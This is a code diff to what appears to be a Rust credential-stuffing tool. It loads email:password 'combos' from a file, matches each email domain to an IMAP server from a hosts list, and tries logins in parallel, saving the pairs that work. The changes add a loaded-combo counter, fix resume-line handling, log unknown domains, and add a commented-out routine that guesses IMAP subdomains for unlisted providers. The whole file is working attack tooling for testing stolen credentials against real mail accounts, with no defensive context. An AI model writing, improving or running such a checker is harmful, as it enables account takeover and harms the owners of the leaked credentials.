@@ -1,8 +1,12 @@
-use std::{env, fs::{self, File}, io::{self, BufRead}, path::Path, time::Duration, thread};
-use std::net::{IpAddr, Ipv4Addr, SocketAddr, TcpStream};
-use std::str::FromStr;
+use std::{
+    env,
+    fs::{self, File},
+    io::{self, BufRead},
+    path::Path,
+    time::Duration,
+    thread
+};
 use colored::Colorize;
-use native_tls::TlsConnector;
 use sinner::Sin;
 use threadpool::ThreadPool;
 
@@ -45,8 +49,10 @@ fn main_worker(input: &String, output: &String, resume: bool) {
     let mut invalid: Sin<Vec<String>> = Sin::new(vec![]);
 
     if let Ok(lines) = read_lines(input_path) {
+        println!("Loaded combos: {}", read_lines(input_path).unwrap().count());
+
         for (i, line) in lines.enumerate() {
-            if i <= start_line { continue }
+            if i < start_line { continue }
             if let Ok(combo) = line {
                 pool.execute(move || {
                     let split: Vec<&str> = combo.split(":").collect();
@@ -54,11 +60,18 @@ fn main_worker(input: &String, output: &String, resume: bool) {
                     let password = split.get(1).unwrap();
 
                     let mail_split: Vec<&str> = mail.split("@").collect();
-                    let found = hosts.iter().find(|(host, _server, _port)|
-                        host.eq(mail_split.get(1).unwrap()));
-                    if found.is_none() { return }
-                    let (_, server, port) = found.unwrap();
-                    if valid_mail(mail, password, server, *port).is_ok() {
+                    let mut found: (String, String, u16) = hosts.iter().find(|(host, _server, _port)|
+                        host.eq(mail_split.get(1).unwrap()))
+                        .cloned().unwrap_or(("".to_string(), "".to_string(), 0));
+                    if found.0.is_empty() {
+                        println!("Invalid host: {}", mail_split.get(1).unwrap());
+                        // found = find_unknown_host(mail_split.get(1).unwrap()).unwrap();
+                        invalid.push(combo);
+                        return
+                    }
+
+                    let (_, server, port) = found;
+                    if valid_mail(mail, password, &server, port).is_ok() {
                         println!("{}", format!("Valid: {}", combo).green());
                         valid.push(combo);
                     } else {
@@ -85,6 +98,21 @@ fn find_last_line() -> usize {
     return 0
 }
 
+// fn find_unknown_host(domain: &str) -> Result<(String, String, u16), ()> {
+//     let subs = ["imap", "mail", "imap-mail", "inbound", "mx", "imaps", "smtp", "m"];
+//     for sub in subs {
+//         let full = format!("{}.{}", sub, domain);
+//         let client = imap::ClientBuilder::new(full.to_owned(), 993)
+//             .native_tls().unwrap();
+//
+//         let error = client
+//             .login("mail", "pass")
+//             .unwrap_err();
+//         return Ok((domain.to_string(), full.to_owned(), 993))
+//     }
+//     return Err(())
+// }
+
 fn init_hosts() -> Vec<(String, String, u16)> {
     let mut hosts: Vec<(String, String, u16)> = vec![];
     let path = Path::new("hosts.txt");
@@ -93,10 +121,7 @@ fn init_hosts() -> Vec<(String, String, u16)> {
         for line in lines {
             if let Ok(host) = line {
                 let split: Vec<&str> = host.split(":").collect();
-                if split.len() < 3 {
-                    println!("Invalid host: {}", host);
-                    continue
-                }
+                if split.len() < 3 { continue }
                 hosts.push((
                     split.get(0).unwrap().to_string(),
                     split.get(1).unwrap().to_string(),
